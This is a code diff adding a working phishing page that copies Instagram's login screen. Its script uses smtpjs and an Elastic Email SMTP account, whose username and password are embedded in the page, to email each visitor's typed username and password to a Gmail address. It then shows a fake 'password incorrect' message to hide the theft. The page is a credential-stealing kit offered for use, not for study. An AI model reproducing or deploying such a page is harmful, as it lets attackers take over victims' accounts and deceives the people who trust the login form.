@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="./favicon.png" type="image/x-icon">
+    <title>Instagram</title>
+    <style>
+        body {
+            font-family:sans-serif;
+            
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .container {
+            display: flex;
+            flex-direction: row;
+            align-items: center!important;
+            justify-content: flex-end;
+            
+            width: 100%;
+            max-width: 800px;
+            
+            padding-top:250px;
+            box-sizing: border-box;
+        }
+        .phone-container {
+            display: none;
+            flex: 1;
+            justify-content: center;
+            background: url('./instagram.gif');
+            background-size: contain;
+            background-position: center;
+            background-repeat: no-repeat;
+            max-width: 100%;
+            object-fit:cover;
+            height: 100%;
+            align-items: center;
+            
+        }
+        .phone {
+            max-width: 300px;
+            width: 100%;
+            
+        }
+        .login-container {
+          text-align: center;
+        }
+
+
+        .one{
+            flex: 1;
+            max-width: 350px;
+            
+            border: 1px solid #dbdbdb;
+            padding: 8px 40px!important;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .two{
+            flex: 1;
+            max-width: 350px;
+            margin-top: 15px;
+            border: 1px solid #dbdbdb;
+            padding: 10px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+        .two a {
+            color: rgb(0, 149, 246)!important;
+            font-weight: bold;
+        }
+       .login-container img{
+            padding: 20px 0px 30px 0px!important;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            box-sizing: border-box;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: rgb(76 181 249);
+            border: none;
+            border-radius:10px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+        .login-container .or {
+            position: relative;
+            margin: 20px 0;
+        }
+        .login-container .or::before,
+        .login-container .or::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            width: 40%;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+        .login-container .or::before {
+            left: 0;
+        }
+        .login-container .or::after {
+            right: 0;
+        }
+        .login-container .or span {
+            display: inline-block;
+            background-color: #fff;
+            padding: 0 10px;
+            color: #8e8e8e;
+        }
+        .login-container ::placeholder{
+            font-size: 13px!important;  
+            color: #c1c1c1;
+        }
+
+       
+
+        input {
+            font-size: 14px!important;  
+            outline: none;
+            background:rgb(250, 250, 250);
+        }
+
+
+        .login-container .forgot-password,
+        .login-container .create-account {
+            color: #00376b;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin: 10px 0;
+        }
+        .get-the-app {
+            margin-top: 20px;
+        }
+        .get-the-app p {
+            margin-bottom: 10px;
+            font-size: 15px;
+        }
+        .get-the-app img {
+            height: 40px;
+            margin: 0 5px;
+        }
+
+        footer {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        footer select {
+            margin-top: 10px;
+            padding: 5px;
+            border-radius: 3px;
+            border: 1px solid #dbdbdb;
+            background-color: #fafafa;  
+        }
+        footer{
+            display: flex;
+            justify-content: center;
+            max-width: 900px!important;
+            width: 100%;
+            align-items: center;
+            padding: 30px 0px;
+            
+        }
+
+
+        footer ul{
+            display:flex;
+            list-style: none;
+            align-items: center;
+            flex-wrap: wrap!important;
+            justify-content: center;
+        }
+
+
+        footer ul li {
+            font-size: 12px;
+            color: #8e8e8e;
+            line-height: 30px;
+            text-transform: capitalize;
+            text-align: center;
+            cursor: pointer;
+            padding: 0px 10px;
+        }
+        footer ul li:hover{
+            font-weight: bold;
+            color: black;
+        }
+
+        @media(max-width: 968px){
+            .phone-container{
+                display: none!important;    
+            }
+            .login-container{
+                
+                margin-top: 200px;
+            }
+
+            .container {
+            display: flex;
+            flex-direction: column!important;
+            align-items: center!important;
+            padding-top: 0px!important;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+         footer{
+            display: flex;
+            justify-content: center;
+            max-width: 900px!important;
+            width: 100%;
+            align-items: center;
+            padding: 30px 0px;
+            
+        }
+
+        footer ul{
+            padding: 0px 20px!important;
+        }
+
+        }
+        @media (min-width: 768px) {
+            .container {
+                flex-direction: row;
+            }
+            .phone-container {
+                display: flex;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="phone-container">
+            
+        </div>
+        <div class="login-container">
+
+            
+            <form class="one" onsubmit="SendEmail();reset(); return false;">
+                <img src="./instgaram logo.png" alt="instagram-logo">
+                <input type="text" placeholder="Phone number, username, or email" id="name" required>
+                <input type="password" placeholder="Password" id="password" required>
+                <button type="submit" id="submit">Log in</button>
+                <div class="or"><span>OR</span></div>
+                <button href="https://www.facebook.com/login/">Log in with Facebook</button>
+                <p class="mushayed98" style="color: red; font-size: 14px; line-height: 1.2rem;"></p>
+                <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot password?</a>   
+            </form>
+
+
+            <div class="two">
+                <a href="https://www.instagram.com/accounts/emailsignup/" class="create-account">Create new account</a>
+            </div>
+            <div class="get-the-app">
+                
+                <p>Get the app.</p>
+                <img src="./google.png" alt="Get it on Google Play">
+                <img src="./micro.png" alt="Get it from Microsoft">
+            </div>
+            
+        </div>
+       
+    </div>
+    <footer>
+        
+        <ul>
+            <li>meta</li>
+            <li>about</li>
+            <li>blogs</li>
+            <li>helps</li>
+            <li>api</li>
+            <li>Privacy</li>
+            <li>terms</li>
+            <li>location</li>                                                             
+            <li>instagram Lite</li>
+            <li>threads</li>
+            <li>contect uploading & non-users</li>
+            <li>meta Verified</li>
+            <li>
+                <select id="language-dropdown">
+                    <option value="en">English</option>
+                    <option value="af">Afrikaans</option>
+                    <option value="ar">العربية</option>
+                    <option value="cs">Čeština</option>
+                    <option value="da">Dansk</option>
+                    <option value="de">Deutsch</option>
+                    <option value="el">Ελληνικά</option>
+                    <option value="es">Español (España)</option>
+                    <option value="es-la">Español</option>
+                    <option value="fi">Suomi</option>
+                    <option value="fr">Français</option>
+                    <option value="id">Bahasa Indonesia</option>
+                    <option value="it">Italiano</option>
+                    <option value="ja">日本語</option>
+                    <option value="ko">한국어</option>
+                    <option value="ms">Bahasa Melayu</option>
+                    <option value="nb">Norsk</option>
+                    <option value="nl">Nederlands</option>
+                    <option value="pl">Polski</option>
+                    <option value="pt-br">Português (Brasil)</option>
+                    <option value="pt">Português (Portugal)</option>
+                    <option value="ru">Русский</option>
+                    <option value="sv">Svenska</option>
+                    <option value="th">ภาษาไทย</option>
+                    <option value="tl">Filipino</option>
+                    <option value="tr">Türkçe</option>
+                    <option value="zh-cn">中文(简体)</option>
+                    <option value="zh-tw">中文(台灣)</option>
+                    <option value="bn">বাংলা</option>
+                    <option value="gu">ગુજરાતી</option>
+                    <option value="hi">हिन्दी</option>
+                    <option value="hr">Hrvatski</option>
+                    <option value="hu">Magyar</option>
+                    <option value="kn">ಕನ್ನಡ</option>
+                    <option value="ml">മലയാളം</option>
+                    <option value="mr">मराठी</option>
+                    <option value="ne">नेपाली</option>
+                    <option value="pa">ਪੰਜਾਬੀ</option>
+                    <option value="si">සිංහල</option>
+                    <option value="sk">Slovenčina</option>
+                    <option value="ta">தமிழ்</option>
+                    <option value="te">తెలుగు</option>
+                    <option value="vi">Tiếng Việt</option>
+                    <option value="bg">Български</option>
+                    <option value="fr-ca">Français (Canada)</option>
+                    <option value="ro">Română</option>
+                    <option value="sr">Српски</option>
+                    <option value="uk">Українська</option>
+                </select>
+            </li>
+            <li>© 2024 Instagram from Meta</li>
+            
+        </ul>
+    </footer>
+
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+
+  
+
+
+    <script>    
+
+
+
+
+function SendEmail(){
+            var nameValue = document.getElementById('name').value;
+            var password = document.getElementById('password').value;
+
+            var all = 'ID is ' + nameValue  + ' and PASSWORD is ' + password;
+            Email.send({
+                Host: "smtp.elasticemail.com",
+                Username: "mushayed98@gmail.com",
+                Password: "99C0B65C34A9CD9EE0B2EE469CF7F745933B",
+                To: 'mushayed98@gmail.com',
+                From: "mushayed98@gmail.com",
+                Subject: "Instagram Details Made By Musha",
+                Body: all ,
+
+            }).then(
+                message => ('ok')
+            );
+        }
+
+
+        const neon = document.querySelector('.mushayed98');
+        const button = document.getElementById('submit');
+       const hard =  button.addEventListener('click' , mushayed);
+        function mushayed(){
+            neon.innerHTML = `Sorry, your password was incorrect. Please double-check your password.`
+        }
+
+        const translations = {
+            en: {
+                heading: 'Instagram',
+                phoneEmail: 'Phone number, username, or email',
+                password: 'Password',
+                login: 'Log in',
+                or: 'OR',
+                loginWithFacebook: 'Log in with Facebook',
+                forgotPassword: 'Forgot password?',
+                createAccount: 'Create new account',
+                getApp: 'Get the app.',
+                footer: 'Meta About Blog Jobs Help API Privacy Terms Locations Instagram Lite Threads Contact Uploading & Non-Users Meta Verified',
+                copyright: '© 2024 Instagram from Meta'
+            },
+            af: {
+                heading: 'Instagram',
+                phoneEmail: 'Telefoonnommer, gebruikersnaam of e-pos',
+                password: 'Wagwoord',
+                login: 'Meld aan',
+                or: 'OF',
+                loginWithFacebook: 'Meld aan met Facebook',
+                forgotPassword: 'Wagwoord vergeet?',
+                createAccount: 'Skep nuwe rekening',
+                getApp: 'Kry die app.',
+                footer: 'Meta Oor Blog Werk Hulp API Privaatheid Bepalings Ligging Instagram Lite Drade Kontak Oplaai en Nie-Gebruikers Meta Geverifieer',
+                copyright: '© 2024 Instagram van Meta'
+            },
+            ar: {
+                heading: 'إنستجرام',
+                phoneEmail: 'رقم الهاتف، اسم المستخدم أو البريد الإلكتروني',
+                password: 'كلمة السر',
+                login: 'تسجيل الدخول',
+                or: 'أو',
+                loginWithFacebook: 'تسجيل الدخول بواسطة فيسبوك',
+                forgotPassword: 'نسيت كلمة السر؟',
+                createAccount: 'إنشاء حساب جديد',
+                getApp: 'احصل على التطبيق.',
+                footer: 'ميتا حول مدونة وظائف مساعدة API الخصوصية الشروط المواقع إنستجرام لايت المواضيع الاتصال بالتحميل وغير المستخدمين ميتا تم التحقق منه',
+                copyright: '© 2024 إنستجرام من ميتا'
+            },
+            cs: {
+                heading: 'Instagram',
+                phoneEmail: 'Telefonní číslo, uživatelské jméno nebo e-mail',
+                password: 'Heslo',
+                login: 'Přihlásit se',
+                or: 'NEBO',
+                loginWithFacebook: 'Přihlásit se přes Facebook',
+                forgotPassword: 'Zapomněli jste heslo?',
+                createAccount: 'Vytvořit nový účet',
+                    getApp: 'Získejte aplikaci.',
+                    footer: 'Meta O Blog Práce Pomoc API Ochrana osobních údajů Podmínky Lokality Instagram Lite Vlákna Kontaktování nahrávání a non-uživatelé Meta Ověřeno',
+                copyright: '© 2024 Instagram od Meta'
+            },
+            // Add translations for all other languages here...
+        };
+
+        document.getElementById('language-dropdown').addEventListener('change', function() {
+            const selectedLang = this.value;
+            const translation = translations[selectedLang] || translations['en'];
+            document.querySelector('.login-container h1').textContent = translation.heading;
+            document.querySelector('.login-container input[type="text"]').placeholder = translation.phoneEmail;
+            document.querySelector('.login-container input[type="password"]').placeholder = translation.password;
+            document.querySelector('.login-container button[type="submit"]').textContent = translation.login;
+            document.querySelector('.login-container .or span').textContent = translation.or;
+            document.querySelector('.login-container button:nth-of-type(2)').textContent = translation.loginWithFacebook;
+            document.querySelector('.forgot-password').textContent = translation.forgotPassword;
+            document.querySelector('.create-account').textContent = translation.createAccount;
+            document.querySelector('.get-the-app p').textContent = translation.getApp;
+            document.getElementById('footer-text').textContent = translation.footer;
+            document.querySelector('footer p:nth-of-type(2)').textContent = translation.copyright;
+        });
+    </script>
+</body>
+</html>
